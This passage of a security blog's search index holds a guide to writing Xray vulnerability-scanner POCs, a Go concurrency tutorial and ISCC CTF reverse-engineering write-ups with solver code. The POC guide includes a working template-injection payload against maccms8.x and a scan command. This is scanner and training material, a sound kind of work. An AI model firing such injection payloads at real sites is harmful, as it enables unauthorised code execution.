<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TODO...</title>
    <link href="/TODO.html"/>
    <url>/TODO.html</url>
    
    <content type="html"><![CDATA[<h3 id="This-is-my-TODO…"><a href="#This-is-my-TODO…" class="headerlink" title="This is my TODO…"></a>This is my TODO…</h3><p><code>时间管理</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何申请Xray高级版</title>
    <link href="/%E5%A6%82%E4%BD%95%E7%94%B3%E8%AF%B7Xray%E9%AB%98%E7%BA%A7%E7%89%88.html"/>
    <url>/%E5%A6%82%E4%BD%95%E7%94%B3%E8%AF%B7Xray%E9%AB%98%E7%BA%A7%E7%89%88.html</url>
    
    <content type="html"><![CDATA[<h3 id="找一个Nday"><a href="#找一个Nday" class="headerlink" title="找一个Nday"></a>找一个Nday</h3><ol><li><p><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p></li><li><p>零组资料库</p></li><li><p>CNVD</p></li><li><p>…</p></li></ol><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>示例:</p><pre><code class="yml">name: poc-漏洞产品-[CVE编号]-描述[rce/weakpasswd...]set:  r: randomInt(800000000, 1000000000)rules:  - method: GET    path: /index.php?m=vod-search&amp;wd={if-A:printf(md5({{r}}))}{endif-A}    follow_redirects: false    expression: |      response.body.bcontains(bytes(md5(string(r))))detail:  Affected Version: &quot;maccms8.x&quot;  author: hanxiansheng26(https://github.com/hanxiansheng26)  links:    - https://www.cnblogs.com/test404/p/7397755.html</code></pre><p>具体的语法可参考官方文档</p><p><a href="https://docs.xray.cool/#/guide/poc" target="_blank" rel="noopener">https://docs.xray.cool/#/guide/poc</a></p><h3 id="验证POC"><a href="#验证POC" class="headerlink" title="验证POC"></a>验证POC</h3><pre><code class="bash">./xray webscan --poc xray/pocs/poc.yml --url http://127.0.0.1/</code></pre><p>如需要查看发包详情，可以在配置文件中设置http代理为burpsuite</p><p><img src="/images/pasted-276.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="提交POC"><a href="#提交POC" class="headerlink" title="提交POC"></a>提交POC</h3><ol><li><p>fork xray</p><p><img src="/images/pasted-267.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>clone到本地(个人仓库中的xray)</p><p><img src="/images/pasted-268.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>进入xray文件夹，新建分支(可以在主分支上提交)</p><pre><code class="bash">┌[bufsnakeのMacBook Pro]-(~/Web-Pentest/xray/xray-dir)-[git://master ✗]-└&gt; git branch test┌[bufsnakeのMacBook Pro]-(~/Web-Pentest/xray/xray-dir)-[git://master ✗]-└&gt; git checkout testM    pocs/glassfish-cve-2017-1000028-lfi.ymlSwitched to branch &#39;test&#39;</code></pre></li><li><p>将编辑好的POC文件移动到pocs文件夹后提交</p><pre><code class="bash">┌[bufsnakeのMacBook Pro]-(~/Web-Pentest/xray/xray-dir)-[git://test ✗]-└&gt; git add .┌[bufsnakeのMacBook Pro]-(~/Web-Pentest/xray/xray-dir)-[git://test ✗]-└&gt; git commit -m &quot;`date`&quot;[test 63dfa7b] modify jupyter-notebook-unauthorized-access1 file changed, 1 insertion(+), 1 deletion(-)┌[bufsnakeのMacBook Pro]-(~/Web-Pentest/xray/xray-dir)-[git://test ✔]-└&gt; git push --set-upstream origin test</code></pre></li><li><p>选择test分支，提交pull request</p><p><img src="/images/pasted-269.png" srcset="/img/loading.gif" alt="upload successful"></p><p>填写相应的内容后点击创建</p><p><img src="/images/pasted-270.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>查看是否通过CI测试</p><p>打√的说明已经通过CI测试<br>打×的需要查看报错详情</p><p><img src="/images/pasted-271.png" srcset="/img/loading.gif" alt="upload successful"></p><p>举个例子</p><p><img src="/images/pasted-272.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-273.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-274.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>根据报错内容修改poc文件，然后在提交</p></li><li><p>等待长亭的师傅审核</p></li></ol><h3 id="领取奖励"><a href="#领取奖励" class="headerlink" title="领取奖励"></a>领取奖励</h3><p><img src="/images/pasted-275.png" srcset="/img/loading.gif" alt="upload successful"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang多核 并行</title>
    <link href="/Golang%E5%A4%9A%E6%A0%B8-%E5%B9%B6%E8%A1%8C.html"/>
    <url>/Golang%E5%A4%9A%E6%A0%B8-%E5%B9%B6%E8%A1%8C.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前学习过程中写的一些工具几乎都是单线程跑，一个程序跑下来很费时间，故而学习了并发并行。</p><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><p>程序中的多个线程在同一CPU单核下被CPU时间片的分配管理。</p><p>假设存在三个线程A、B、C。</p><p>线程A运行到一半的时候，CPU分配的时间片到期(CPU保存当前线程A的上下文)，就会强行执行其他的线程(其他线程同理)。</p><h3 id="并行"><a href="#并行" class="headerlink" title="并行"></a>并行</h3><p>程序中的多个线程在多个CPU的多个核心下运行。</p><p>假设存在三个线程A、B、C。</p><p>线程A运行在CPU的第一个线程上，同时线程B运行在CPU的第二个线程上(线程C同理)。</p><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><h4 id="单线程-默认使用CPU一个核心"><a href="#单线程-默认使用CPU一个核心" class="headerlink" title="单线程(默认使用CPU一个核心)"></a>单线程(默认使用CPU一个核心)</h4><pre><code class="golang">package mainimport (    &quot;time&quot;    &quot;fmt&quot;)func main() {    start := time.Now()    for i:=0;i&lt;100000000;i++ {        fmt.Println(i)    }    fmt.Println(time.Now().Sub(start))}</code></pre><h4 id="多线程-由runtime-GOMAXPROCS-num-指定"><a href="#多线程-由runtime-GOMAXPROCS-num-指定" class="headerlink" title="多线程(由runtime.GOMAXPROCS(num)指定)"></a>多线程(由runtime.GOMAXPROCS(num)指定)</h4><pre><code class="golang">package mainimport (    &quot;fmt&quot;    &quot;runtime&quot;    &quot;strconv&quot;    &quot;sync&quot;    &quot;time&quot;)var wait sync.WaitGroupfunc main() {    start := time.Now()    runtime.GOMAXPROCS(runtime.NumCPU()/4 * 3)    var test int64 = 100000000    ch := make(chan int64,1000)    var i int64 = 0    for ;i&lt;test;i += 100000 {        wait.Add(1)        go Factory(i,ch)    }    wait.Wait()    fmt.Println(time.Now().Sub(start))}func Factory(input int64, ch chan int64) {    var i int64 = input    for ;i&lt;input + 100000;i++ {        fmt.Println(i)    }    wait.Done()}</code></pre><h4 id="对比结果"><a href="#对比结果" class="headerlink" title="对比结果"></a>对比结果</h4><ol><li><p>单线程</p><p><img src="/images/pasted-260.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>多线程</p><p><img src="/images/pasted-261.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><p>时间上两者耗时差不多，这是为啥?</p><h4 id="打印函数的耗时"><a href="#打印函数的耗时" class="headerlink" title="打印函数的耗时"></a>打印函数的耗时</h4><pre><code class="golang">package mainimport (    &quot;time&quot;    &quot;fmt&quot;)func main() {    start := time.Now()    for i:=0;i&lt;100000000;i++ {        //fmt.Println(i)    }    fmt.Println(time.Now().Sub(start))}</code></pre><p><img src="/images/pasted-262.png" srcset="/img/loading.gif" alt="upload successful"></p><p>虽然单线程和多线程所用的CPU线程数量是有很大差别的，但是整体的程序调用Println函数的次数是相同的(浅显的理解)。</p><h4 id="再次运行多线程"><a href="#再次运行多线程" class="headerlink" title="再次运行多线程"></a>再次运行多线程</h4><ol><li>CPU单线程</li></ol><p><img src="/images/pasted-263.png" srcset="/img/loading.gif" alt="upload successful"></p><ol start="2"><li>CPU2线程</li></ol><p><img src="/images/pasted-264.png" srcset="/img/loading.gif" alt="upload successful"></p><ol start="3"><li>CPU3线程</li></ol><p><img src="/images/pasted-265.png" srcset="/img/loading.gif" alt="upload successful"></p><ol start="4"><li>CPU4线程</li></ol><p><img src="/images/pasted-266.png" srcset="/img/loading.gif" alt="upload successful"></p><p>可见，随着CPU线程数的增多，消耗的时间也在慢慢减少。</p><h4 id="CPU线程数设置多少合适"><a href="#CPU线程数设置多少合适" class="headerlink" title="CPU线程数设置多少合适?"></a>CPU线程数设置多少合适?</h4><p>经测试，在多台机器下，CPU线程数设置为CPU总线程数的四分之三即可。</p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCC 逆向 WP</title>
    <link href="/ISCC-%E9%80%86%E5%90%91-WP.html"/>
    <url>/ISCC-%E9%80%86%E5%90%91-WP.html</url>
    
    <content type="html"><![CDATA[<h3 id="无标点日记"><a href="#无标点日记" class="headerlink" title="无标点日记"></a>无标点日记</h3><pre><code class="c">void __cdecl __noreturn sub_401190(char *a1){  int v1; // [esp+4Ch] [ebp-Ch]  signed int i; // [esp+54h] [ebp-4h]  if ( strlen(a1) == 16 )  {    for ( i = 0; i &lt; 16; ++i )    {      v1 = i + a1[i] - unk_432A60[i] + 19;      // i + input[i] - byte[i] + 19      if ( v1 &lt;= 0 )      {        sub_40100F(OhhMywifewaslost);           // OhhMywifewaslost      }      else if ( OhhMywifewaslost[i] != unk_432A73[v1] )      {        sub_40100F(OhhMywifewaslost);      }    }  }  sub_401005();}</code></pre><p><code>sub_40100F</code>对字符串<code>&quot;OhhMywifewaslost&quot;</code>进行操作。</p><p>根据用户输入的16个字符，判断每个字符对应的v1是否进行加密。</p><pre><code class="python">puzzle = [0x00,0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A]Oh = &#39;OhhMywifewaslost&#39;aaaa = [ 0x29, 0x6A, 0x68, 0x46, 0x66, 0x5B, 0x67, 0x7D, 0x6F, 0x6D, 0x77, 0x62, 0x76, 0x28, 0x25, 0x25]flag = &#39;&#39;for i in range(0,16):    for inputs in range(0,255):        v = i + inputs - aaaa[i] + 19        if v &gt; 0 and v &lt; len(puzzle):            if puzzle[v] == ord(Oh[i]):                flag += chr(inputs)                print(flag)// Iheardascream!!!                </code></pre><p><code>&quot;Iheardascream!!!&quot;</code>字符串的每一位都表示不经过<code>sub_40100F</code></p><pre><code class="bash">C:\Users\Bufsnake\Desktop&gt;puzzle.exeIheardaloudnoiseand Iheardascream!!!get{OhhMywifewaslost}</code></pre><p>所以可以在此基础上控制<code>&quot;OhhMywifewaslost&quot;</code>是否经过<code>sub_40100F</code>，以及经过的次数.</p><pre><code class="bash"># 加密一次的情况C:\Users\Bufsnake\Desktop&gt;puzzle.exeIheardaloudnoiseand Iheardascream!!aget{Wearecockroaches}# 加密二次的情况C:\Users\Bufsnake\Desktop&gt;puzzle.exeIheardaloudnoiseand Iheardascream!aaget{甧皽?{嵵r稾l?蛚...</code></pre><p>Flag:flag{Wearecockroaches}</p><h3 id="flag是好长好长的一段数字"><a href="#flag是好长好长的一段数字" class="headerlink" title="flag是好长好长的一段数字"></a>flag是好长好长的一段数字</h3><p>主活动代码如下</p><pre><code class="java">package com.example.myapplication;import android.os.Bundle;import android.util.Base64;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity {    /* renamed from: e */    String f32e;    /* access modifiers changed from: protected */    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) C0274R.layout.activity_main);        final EditText editText = (EditText) findViewById(C0274R.C0276id.text);        final EditText editText2 = (EditText) findViewById(C0274R.C0276id.text1);        Button button = (Button) findViewById(C0274R.C0276id.button1);        ((Button) findViewById(C0274R.C0276id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (MainActivity.this.check(editText.getText().toString())) {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;用户名正确！&quot;, 1).show();                } else {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;用户名错误！！&quot;, 1).show();                }            }        });        button.setOnClickListener(new OnClickListener() {            public void onClick(View view) {                String obj = editText2.getText().toString();                MainActivity mainActivity = MainActivity.this;                if (mainActivity.check2(obj, mainActivity.f32e)) {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;success!!&quot;, 1).show();                } else {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;defeated!&quot;, 1).show();                }            }        });    }    /* access modifiers changed from: 0000 */    public boolean check(String str) {        if (str.length() == 0) {            return false;        }        String lowerCase = Base64.encodeToString(str.getBytes(), 0).toLowerCase();        this.f32e = lowerCase;        if (lowerCase.substring(3, 9).equals(&quot;dqy1ba&quot;)) {            return true;        }        return false;    }    /* access modifiers changed from: 0000 */    public boolean check2(String str, String str2) {        String str2HexStr = str2HexStr(str2);        StringBuilder sb = new StringBuilder();        sb.append(str2HexStr);        sb.append(str);        return checkcode(sb.toString()).equals(&quot;5731d798714022433553234173&quot;);    }    public String checkcode(String str) {        String[] strArr = new String[15];        try {            strArr[0] = str.substring(0, 2);            strArr[1] = str.substring(2, 4);            strArr[2] = str.substring(4, 6);            strArr[3] = str.substring(6, 8);            strArr[4] = str.substring(8, 10);            strArr[5] = str.substring(10, 12);            strArr[6] = str.substring(12, 14);            strArr[7] = str.substring(14, 16);            strArr[8] = str.substring(16, 18);            strArr[9] = str.substring(18, 20);            strArr[10] = str.substring(20, 22);            strArr[11] = str.substring(22, 24);            strArr[12] = str.substring(24, 26);            strArr[13] = str.substring(26, 28);            strArr[14] = str.substring(28, 30);        } catch (Exception unused) {        }        String str2 = BuildConfig.FLAVOR;        String str3 = str2;        for (int i = 0; i &lt; 14; i++) {            if (i == 0) {                str3 = xor(strArr[i], strArr[i + 1]);                StringBuilder sb = new StringBuilder();                sb.append(str2);                sb.append(str3);                str2 = sb.toString();            } else {                str3 = xor(str3, strArr[i]);                StringBuilder sb2 = new StringBuilder();                sb2.append(str2);                sb2.append(str3);                str2 = sb2.toString();            }        }        return str2;    }    private static String xor(String str, String str2) {        String binaryString = Integer.toBinaryString(Integer.valueOf(str, 16).intValue());        String binaryString2 = Integer.toBinaryString(Integer.valueOf(str2, 16).intValue());        String str3 = &quot;0&quot;;        if (binaryString.length() != 8) {            for (int length = binaryString.length(); length &lt; 8; length++) {                StringBuilder sb = new StringBuilder();                sb.append(str3);                sb.append(binaryString);                binaryString = sb.toString();            }        }        if (binaryString2.length() != 8) {            for (int length2 = binaryString2.length(); length2 &lt; 8; length2++) {                StringBuilder sb2 = new StringBuilder();                sb2.append(str3);                sb2.append(binaryString2);                binaryString2 = sb2.toString();            }        }        String str4 = BuildConfig.FLAVOR;        for (int i = 0; i &lt; binaryString.length(); i++) {            if (binaryString2.charAt(i) == binaryString.charAt(i)) {                StringBuilder sb3 = new StringBuilder();                sb3.append(str4);                sb3.append(str3);                str4 = sb3.toString();            } else {                StringBuilder sb4 = new StringBuilder();                sb4.append(str4);                sb4.append(&quot;1&quot;);                str4 = sb4.toString();            }        }        Log.e(&quot;code&quot;, str4);        return Integer.toHexString(Integer.parseInt(str4, 2));    }    public static String str2HexStr(String str) {        char[] charArray = &quot;0123456789abcdef&quot;.toCharArray();        StringBuilder sb = new StringBuilder(BuildConfig.FLAVOR);        byte[] bytes = str.getBytes();        for (int i = 0; i &lt; bytes.length; i++) {            sb.append(charArray[(bytes[i] &amp; 240) &gt;&gt; 4]);            sb.append(charArray[bytes[i] &amp; 15]);        }        return sb.toString().trim();    }}</code></pre><p>通过<code>dqy1ba</code>中的<code>qy1b</code>解密得到<code>C-A</code>结合比赛名称与出题者，可得知用户名为<code>ISCC-AiQiong</code>，并且由于<code>ISCC-AiQiong</code>经过加密后长度足够长，导致checkcode的时候不会判断注册码是否正确，只会判断用户名，无论输入什么注册码都会成功。但不知道flag到底是个啥。</p><p>后来更新了题目附件</p><pre><code class="java">package com.example.myapplication;import android.os.Bundle;import android.util.Base64;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import androidx.appcompat.app.AppCompatActivity;public class MainActivity extends AppCompatActivity {    /* renamed from: e */    String f32e;    /* access modifiers changed from: protected */    public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) C0274R.layout.activity_main);        final EditText editText = (EditText) findViewById(C0274R.C0276id.text);        final EditText editText2 = (EditText) findViewById(C0274R.C0276id.text1);        Button button = (Button) findViewById(C0274R.C0276id.button1);        ((Button) findViewById(C0274R.C0276id.button)).setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (MainActivity.this.check(editText.getText().toString())) {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;用户名正确！&quot;, 1).show();                } else {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;用户名错误！！&quot;, 1).show();                }            }        });        button.setOnClickListener(new OnClickListener() {            public void onClick(View view) {                if (MainActivity.this.check2(editText2.getText().toString())) {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;success!!&quot;, 1).show();                } else {                    Toast.makeText(MainActivity.this.getApplicationContext(), &quot;defeated!&quot;, 1).show();                }            }        });    }    /* access modifiers changed from: 0000 */    public boolean check(String str) {        if (str.length() == 0) {            return false;        }        String lowerCase = Base64.encodeToString(str.getBytes(), 0).toLowerCase();        this.f32e = lowerCase;        if (lowerCase.substring(3, 9).equals(&quot;dqy1ba&quot;)) {            return true;        }        return false;    }    /* access modifiers changed from: 0000 */    public boolean check2(String str) {        return checkcode(str2HexStr(str)).equals(&quot;23243673763173613543db&quot;);    }    public String checkcode(String str) {        String[] strArr = new String[15];        try {            strArr[0] = str.substring(0, 2);            strArr[1] = str.substring(2, 4);            strArr[2] = str.substring(4, 6);            strArr[3] = str.substring(6, 8);            strArr[4] = str.substring(8, 10);            strArr[5] = str.substring(10, 12);            strArr[6] = str.substring(12, 14);            strArr[7] = str.substring(14, 16);            strArr[8] = str.substring(16, 18);            strArr[9] = str.substring(18, 20);            strArr[10] = str.substring(20, 22);            strArr[11] = str.substring(22, 24);            strArr[12] = str.substring(24, 26);            strArr[13] = str.substring(26, 28);            strArr[14] = str.substring(28, 30);        } catch (Exception unused) {        }        String str2 = BuildConfig.FLAVOR;        String str3 = str2;        for (int i = 0; i &lt; 15; i++) {            if (i == 0) {                str3 = xor(strArr[i], strArr[i + 1]);                StringBuilder sb = new StringBuilder();                sb.append(str2);                sb.append(str3);                str2 = sb.toString();            } else {                str3 = xor(str3, strArr[i]);                StringBuilder sb2 = new StringBuilder();                sb2.append(str2);                sb2.append(str3);                str2 = sb2.toString();            }        }        return str2;    }    private static String xor(String str, String str2) {        String binaryString = Integer.toBinaryString(Integer.valueOf(str, 16).intValue());        String binaryString2 = Integer.toBinaryString(Integer.valueOf(str2, 16).intValue());        String str3 = &quot;0&quot;;        if (binaryString.length() != 8) {            for (int length = binaryString.length(); length &lt; 8; length++) {                StringBuilder sb = new StringBuilder();                sb.append(str3);                sb.append(binaryString);                binaryString = sb.toString();            }        }        if (binaryString2.length() != 8) {            for (int length2 = binaryString2.length(); length2 &lt; 8; length2++) {                StringBuilder sb2 = new StringBuilder();                sb2.append(str3);                sb2.append(binaryString2);                binaryString2 = sb2.toString();            }        }        String str4 = BuildConfig.FLAVOR;        for (int i = 0; i &lt; binaryString.length(); i++) {            if (binaryString2.charAt(i) == binaryString.charAt(i)) {                StringBuilder sb3 = new StringBuilder();                sb3.append(str4);                sb3.append(str3);                str4 = sb3.toString();            } else {                StringBuilder sb4 = new StringBuilder();                sb4.append(str4);                sb4.append(&quot;1&quot;);                str4 = sb4.toString();            }        }        return Integer.toHexString(Integer.parseInt(str4, 2));    }    public static String str2HexStr(String str) {        char[] charArray = &quot;0123456789abcdef&quot;.toCharArray();        StringBuilder sb = new StringBuilder(BuildConfig.FLAVOR);        byte[] bytes = str.getBytes();        for (int i = 0; i &lt; bytes.length; i++) {            sb.append(charArray[(bytes[i] &amp; 240) &gt;&gt; 4]);            sb.append(charArray[bytes[i] &amp; 15]);        }        return sb.toString().trim();    }}</code></pre><p>改动还挺大</p><p><img src="images/writeup.assets/image-20200504004413633.png" srcset="/img/loading.gif" alt="image-20200504004413633"></p><p>用户名还是输入<code>ISCC-AiQiong</code>，但是用户名输入的这次改变不了注册码。</p><p><code>23243673763173613543db</code>长度为22，因为加密后的结果如果为0x0b，则只会返回’b’字符，需要填充8个0，但是不知道填在哪8个位置。</p><pre><code class="python">import z3solve = z3.Solver()s = []for i in range(0,15):    s.append(z3.BitVec(&#39;s[%d]&#39;%i,8))# 23243673763173613543dbfor i in s:    solve.add(i &gt;= ord(&#39;0&#39;))    solve.add(i &lt;= ord(&#39;9&#39;))solve.add(s[0] ^ s[1] == 2)   // 因为都为数字，所以第一位和第二位 xor 得到的结果肯定小于0xfsolve.add(2 ^ s[1] == 0x32)   // 逐步探测 0x32 或 0x3solve.add(0x32 ^ s[2] == 0x4) // 发现规律，0，2，4，6...需要在前面添加&#39;0&#39;solve.add(0x4 ^ s[3] == 0x36)solve.add(0x36 ^ s[4] == 0x7)solve.add(0x7 ^ s[5] == 0x37)solve.add(0x37 ^ s[6] == 0x6)solve.add(0x6 ^ s[7] == 0x31)solve.add(0x31 ^ s[8] == 0x7)solve.add(0x7 ^ s[9] == 0x36)solve.add(0x36 ^ s[10] == 0x1)solve.add(0x1 ^ s[11] == 0x35)solve.add(0x35 ^ s[12] == 0x4)solve.add(0x4 ^ s[13] == 0x3d)solve.add(0x3d ^ s[14] == 0xb)solve.add(s[0] ^ s[1] ^ s[1] ^ s[2] ^ s[3] ^ s[4] ^ s[5] ^ s[6] ^ s[7] ^ s[8] ^ s[9] ^ s[10] ^ s[11] ^ s[12] ^ s[13] ^ s[14] == 0xb)if solve.check() == z3.sat:    for i in range(0,15):        print(solve.model()[s[i]],&quot;,&quot;,end=&#39;&#39;)print(&#39;&#39;)flag = [50 ,48 ,54 ,50 ,49 ,48 ,49 ,55 ,54 ,49 ,55 ,52 ,49 ,57 ,54]print(&#39;&#39;.join(chr(i) for i in flag))// flag{206210176174196}</code></pre><h3 id="苏大强的保险箱-01"><a href="#苏大强的保险箱-01" class="headerlink" title="苏大强的保险箱-01"></a>苏大强的保险箱-01</h3><pre><code class="python">In [1]: b = [0xD5, 0x9E, 0xB4, 0x70, 0x78, 0x60, 0x82, 0x70, 0x39, 0x5E]In [2]: a = [0x0A, 0x07, 0x41, 0x0B, 0x2C, 0x0C, 0x3D, 0x38, 0x27, 0x73]In [3]: m = []In [4]: for i in range(len(a)):   ...:     m.append(b[9-i] -i -a[i])   ...:In [5]: mOut[5]: [84, 49, 45, 116, 48, 103, 45, 117, 111, 89]In [6]: &#39;&#39;.join(chr(i) for i in m)Out[6]: &#39;T1-t0g-uoY&#39;In [7]: m.reverse()In [8]: &#39;&#39;.join(chr(i) for i in m)Out[8]: &#39;You-g0t-1T&#39;</code></pre><h3 id="Never-Give-Up"><a href="#Never-Give-Up" class="headerlink" title="Never Give Up"></a>Never Give Up</h3><p>文件格式错误，需要修改，经过查阅资料，发现损坏的是dex文件，dex文件有个关键字<code>xV4</code>搜索发现存在两处，修改如下：</p><p><img src="images/writeup.assets/image-20200504183507982.png" srcset="/img/loading.gif" alt="image-20200504183507982"></p><p>使用dex2jar将dex转成jar文件。</p><p>使用jadx打开jar文件，如下图，可以成功反编译</p><p><img src="images/writeup.assets/image-20200504183652468.png" srcset="/img/loading.gif" alt="image-20200504183652468"></p><p><img src="images/writeup.assets/image-20200504215457540.png" srcset="/img/loading.gif" alt="image-20200504215457540"></p><p>分析程序得到</p><pre><code class="python">ZIP压缩(AES(SHA256(15431516836),flag)) == &quot;XXXXXXXXXXXD7BA396A2249B7AE45CDC9D09DB16BE5C56DAB147F3CC8172BDF8DAC95545737AB5BB01163F10AA&quot;</code></pre><p>可以发现经过zip压缩之后前12个字符是固定的，所以</p><pre><code class="c">&quot;78BBA4F709ED7BA396A2249B7AE45CDC9D09DB16BE5C56DAB147F3CC8172BDF8DAC95545737AB5BB01163F10AA&quot;</code></pre><p>可以得到</p><pre><code class="python">ZIP压缩(AES(&quot;890af61d119e419329e5c660d4ec92a850544e101a7142d1b653836fddd942eb&quot;,flag)) = &quot;78BBA4F709ED7BA396A2249B7AE45CDC9D09DB16BE5C56DAB147F3CC8172BDF8DAC95545737AB5BB01163F10AA&quot;</code></pre><p>解密代码如下</p><pre><code class="java">import java.io.UnsupportedEncodingException;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Cipher;import javax.crypto.KeyGenerator;import javax.crypto.*;import java.security.SecureRandom;import java.io.ByteArrayOutputStream;import java.util.zip.DataFormatException;import java.util.zip.Deflater;import java.util.zip.Inflater;public class output {    public static void main(String[] args){        byte[] output = new byte[1024];        output = J(G(&quot;78BBA4F709ED7BA396A2249B7AE45CDC9D09DB16BE5C56DAB147F3CC8172BDF8DAC95545737AB5BB01163F10AA&quot;));        output = decrypt(output,G(&quot;890AF61D119E419329E5C660D4EC92A850544E101A7142D1B653836FDDD942EB&quot;));        for (byte b : output) {            System.out.print((char)b);        }    }    public static byte[] G(String str) {        int length = str.length() / 2;        byte[] bArr = new byte[length];        for (int i = 0; i &lt; length; i++) {            bArr[i] = Integer.valueOf(str.substring(i * 2, (i * 2) + 2), 16).byteValue();        }        return bArr;    }    public static byte[] J(byte[] bArr) {        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(bArr.length);        Inflater inflater = new Inflater();        try {            inflater.setInput(bArr);            byte[] bArr2 = new byte[64];            while (!inflater.finished()) {                int inflate = inflater.inflate(bArr2);                if (inflate == 0) {                    inflater.setDictionary(&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;.getBytes());                } else {                    byteArrayOutputStream.write(bArr2, 0, inflate);                }            }        } catch (DataFormatException e) {            e.printStackTrace();        } finally {            inflater.end();        }        return byteArrayOutputStream.toByteArray();    }    public static byte[] decrypt(byte[] cipherBytes, byte[] key){        try{            // 生成密钥对象            SecretKey secKey = new SecretKeySpec(key, &quot;AES&quot;);            // 获取 aes 密码器            Cipher cipher = Cipher.getInstance(&quot;AES&quot;);            // 初始化密码器（解密模型）      // 1 是加密模式CIPHER.ENCRYPT_MODE      // 2 是解密模式CIPHER.DECRYPT_MODE            cipher.init(2,secKey); //             // 解密数据, 返回明文            return cipher.doFinal(cipherBytes);        }catch(Exception e) {            System.out.println(&quot;\n&quot;+e);        }        byte a[] = {1,2,3};        return a;    }}// flag{L1r3n5u0xI4n9J15h1}</code></pre><h3 id="Obfu"><a href="#Obfu" class="headerlink" title="Obfu"></a>Obfu</h3><p>查看函数列表发现encode1，调用其的地址在那9999个函数中，猜测只有它参与了加密，9999个函数只是幌子。</p><p><img src="images/writeup.assets/image-20200502211429540.png" srcset="/img/loading.gif" alt="image-20200502211429540"></p><p>测试在文件中输入32个’1’。</p><p><img src="images/writeup.assets/image-20200502211508348.png" srcset="/img/loading.gif" alt="image-20200502211508348"></p><p>在encode2前下个断点，得到的数据和encode1后得到的数据是相同的。</p><p><img src="images/writeup.assets/image-20200502211931405.png" srcset="/img/loading.gif" alt="image-20200502211931405"></p><p><img src="images/writeup.assets/image-20200502211330739.png" srcset="/img/loading.gif" alt="image-20200502211330739"></p><p>接下来分析encode2函数</p><p>变种的腾讯tea加密 <code>de1ta = 0xdeadbeef</code></p><p>获取当前时间戳，通过以下代码得到key值</p><pre><code class="c">v3 = 0;printf(&quot;Your Key %X,But I Can&#39;t Give It To You.\n&quot;, v0);result = (v0 ^ 0xDEADBEEF);v2 = v0 ^ 0xDEADBEEF;for ( i = 0; i &lt;= 3; ++i ){  for ( j = 0; j &lt;= 31; ++j )    v3 ^= (v2 &gt;&gt; j) &amp; 1;  v2 = v3 | 2 * v2;  result = i;  *(&amp;key + i) = v2;}</code></pre><p>每8位一组将32位加密</p><pre><code class="c">for ( k = 0; k &lt;= 31; k += 8 )  result = EncryptTEA((k + 8605856LL), (k + 4 + 8605856LL), &amp;key);</code></pre><p>解密代码如下</p><pre><code class="python">def get_key(time):    key = []    v2 = time ^ 0xDEADBEEF    v3 = 0    for j in range(0,4):        for k in range(0,32):            v3 = v3 ^ (v2 &gt;&gt; k) &amp; 1        v2 = (v3 | (v2 &lt;&lt; 1)) &amp; 0xffffffff        key.append(v2)    return keydef replace_3_5(byte):    byte = ((byte &gt;&gt; 5) | (byte &lt;&lt; 3)) &amp; 0xff    return bytedef decode(first,second,key):    num = (0xdeadbeef &lt;&lt; 4) &amp; 0xffffffff    for i in range(0,16):        one = (first + num) &amp; 0xffffffff        two = ((first &lt;&lt; 3) + key[2]) &amp; 0xffffffff        thr = ((first &gt;&gt; 6) + key[3]) &amp; 0xffffffff        second = (second - (one ^ two ^ thr)) &amp; 0xffffffff        one = (second + num) &amp; 0xffffffff        two = ((second &lt;&lt; 3) + key[0]) &amp; 0xffffffff        thr = ((second &gt;&gt; 6) + key[1]) &amp; 0xffffffff        first = (first - (one ^ two ^ thr))&amp;0xffffffff        num = (num - 0xdeadbeef) &amp; 